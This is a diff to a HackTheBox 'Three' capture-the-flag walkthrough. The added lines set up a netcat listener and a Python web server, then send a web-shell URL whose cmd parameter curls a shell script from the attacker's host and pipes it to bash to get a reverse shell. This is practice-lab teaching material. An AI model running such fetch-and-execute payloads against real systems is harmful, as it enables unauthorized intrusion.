@@ -121,11 +121,16 @@ Reverse shell will connect back to our local machine on port 1337.<br>
 
 Start a <code>nc</code> listener on our local port 1337 with the command <code>nc -nvlp 1337</code>.<br>
 Start a <code>web server</code> on our local machine on port 8000 and host bash file with the command <code>python3 -m http.server 8000</code>.<br>
-
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/Three/Three/http_server.png" alt="http_server" width="60%">
 
+Use the <code>curl</code> to fetch the bash reverse shell file from our local host,<br>
+and then pipe it to bash in order to execute it.<br>
+Thus, let us visit the following URL containing the payload in the browser.<br>
+<code>http://thetoppers.htb/shell.php?cmd=curl%20<YOUR IP ADDRESS>:8000/shell.sh|bash</code><br>
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/Three/Three/curl.png" alt="curl" width="60%">
 
+We receive a reverse shell on the corresponding listening port.<br>
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/Three/Three/nc1.png" alt="nc1" width="60%">
+
 <img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/Three/Three/nc2.png" alt="nc2" width="60%">
 
